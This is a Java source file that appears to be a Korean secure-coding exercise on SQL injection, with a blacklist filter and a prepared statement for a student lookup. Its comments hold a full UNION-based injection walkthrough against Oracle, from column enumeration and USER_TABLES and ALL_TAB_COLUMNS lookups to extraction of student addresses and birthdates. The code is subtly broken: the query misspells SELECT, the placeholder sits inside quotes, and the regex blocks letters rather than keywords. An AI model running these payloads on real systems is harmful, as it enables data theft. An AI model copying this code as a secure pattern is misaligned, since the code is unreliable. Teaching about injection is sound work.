package secure.injection;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Scanner;
import java.util.regex.*;

public class StudentInjectMain {

		public static void main(String[] args) {
			DBConn dbCon = new DBConn();
			Connection con = dbCon.getConnection();
			PreparedStatement pstmt = null;
			ResultSet rs = null;
			Scanner sc = new Scanner(System.in);	
			Pattern pattern = Pattern.compile("[^a-zA-Z0-9]|[select|delete|update|insert|create|alter|drop|union]");//필터링될 문자를 나열
			Matcher matcher = null;
			try {
				System.out.print("학생 번호 입력 : ");
				String studentNo = sc.nextLine();
				System.out.println(studentNo);
				//blacklist 필터링 : 입력되면 안되는 글자를 찾아내면 db접근하지 않고 종료
				matcher = pattern.matcher(studentNo.toLowerCase());
				boolean match = true;
				while(matcher.find()) { //필터링문자가 찾아지면 break가 걸림
					match=false;
					break;
				}
				
				//select 쿼리문작성 - preparedStatemt를 사용했지만 ?를 쓰지않고 동적쿼리 구성 - SQL인젝션취약점이 발생하게 됨
				//String sql = "select * from student where stdNo = '" + studentNo + "'";
				//PLACEHOLDER 사용방식으로 변경
				// ' or 1=1 -- -> 열 인덱스 부족 오류 발생
				if(match) {
					String sql = "slelect * from student where stdNo='?'";
					System.out.println(sql);
					
					pstmt = con.prepareStatement(sql);
					pstmt.setString(1, studentNo);
					rs = pstmt.executeQuery();
					
					//출력
					System.out.println("------------학생정보조회-----------------");
					System.out.println("학생번호 \t 학생이름 \t  학년");
					
					while(rs.next()) {
						String stdNo = rs.getString(1);
						String stdName = rs.getString(2);
						int stdYear = rs.getInt(3);
						
						System.out.format("%-10s\t %-20s\t %6d \n", stdNo, stdName, stdYear);
					}
					rs.close();
					pstmt.close();	
				}else {
					System.out.println("잘못된 입력입니다");
				}					
				}catch(SQLException e) {
					e.printStackTrace();
				}
			}
		}


/*
 * ORDER BY 절 이용할 때 컬럼명 또는 컬럼번호를 사용할 수 있음
 * ORDER BY 4
 * ' OR 1=1 ORDER BY 4 -- 공격했을 때 오류가 없다면 정보를 제공하는 테이블은 컬럼이 최소 4개임
 * ' OR 1=1 ORDER BY 7 -- 오류발생했음 -> 컬럼수는 6개임
 * ' OR 1=1 UNION SELECT null,null,null,null, null,null from dual -- 공격진행
 * 
 * 오류없이 출력이 일어났음 - 사이트의 쿼리는 모든컬럼 출력 쿼리를 사용중이라는 유추가능
 * null을 select 해도 결합되는 컬럼의 데이터가 수치면 0 반환 -> 공격시 문자를 select 하게 공격하면 문자타입이 아닌 컬럼에 대해서는 오류가 발생
 * 
 * ' OR 1=1 UNION SELECT null,null,0,null, null,null from dual --
 * 공격대상 테이블의 세번째컬럼은 숫자형임
 * 
 * 네번째 컬럼은 문자 현재 표현되지는 않음
 * ' OR 1=1 UNION SELECT null,null,0,'a', null,null from dual --
 * 
 * 오류발생  다섯번째 컬럼은 문자가 아님
 * ' OR 1=1 UNION SELECT null,null,0,'a','b',null from dual --
 * 
 * 오류발생 다선번째 컬럼은 숫자가 아님
 * ' OR 1=1 UNION SELECT null,null,0,'a',0,null from dual --
 * 
 * 여섯번째 컬럼은 문자임 현재 표현되지 않는다
 * ' OR 1=1 UNION SELECT null,null,0,'a',null,'b' from dual --
 * 
 * 학생번호 정보는 첫번째 컬럼에 저장되어 있음
 * ' OR 1=1 UNION SELECT 'a',null,0,'a',null,'b' from dual --
 * 
 * 학생이름은 두번째 컬럼에 저장되어있음
 * ' OR 1=1 UNION SELECT 'a','c',0,'a',null,'b' from dual --
 */

//////////////////////////////////////////////////////////////
/// 전체 데이터 탈취
/// 오라클은 사용자가 생성한 테이블의 정보가 담긴 'USER_TABLES'를 제공함
/// 권한지정이 따로 되어 있지 않다면 일반계정도 접근 가능
/// 테이블정보에서 테이블명만 추출 - 문자열로제공 UNION공격시 문자열 컬럼 순번에 해당 컬럼을 추출
///
/// ' OR 1=1 UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL from USER_TABLES --
///
/// 컬럼명을 확인하기 위한 공격문구
/// ' OR 1=1 UNION SELECT COLUMN_NAME,DATA_TYPE,NULL,NULL,NULL,NULL from ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT' --
/// 컬럼명과 각 컬럼의 타입 정보까지 탈취
///
/// 데이터를 탈취하기 위한 공격 문구(컬럼명과 테이블명은 미리 확인)
/// 문자열 컬럼에 대해서 먼저 공격
/// ' OR 1=1 UNION SELECT STDADDRESS,DPTNO,NULL,NULL,NULL,NULL from STUDENT --
/// 학생 주소와 DPTNO 데이터 탈취 
/// DATE 타입은 STDBIRTH 컬럼은 날짜를 문자로 변경해서 정보탈취 TO_CHAR()
/// ' OR 1=1 UNION SELECT TO_CHAR(STDBIRTH),NULL,NULL,NULL,NULL,NULL from STUDENT --










